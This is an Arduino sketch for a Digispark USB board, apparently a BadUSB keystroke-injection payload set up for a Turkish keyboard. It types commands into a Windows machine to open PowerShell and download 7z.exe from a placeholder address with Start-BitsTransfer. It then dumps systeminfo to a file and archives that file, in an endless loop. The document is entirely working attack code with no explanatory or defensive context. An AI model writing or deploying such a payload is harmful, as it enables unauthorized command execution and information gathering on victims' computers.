#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() { }
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(6000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.print("Start-BitsTransfer 7z.exe_address 7z.exe");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(9000);
  DigiKeyboard.print("systeminfo > bilgi.txt");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);
  DigiKeyboard.print("./7z.exe a bilgi.7z bilgi.txt");
  DigiKeyboard.delay(6000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
}
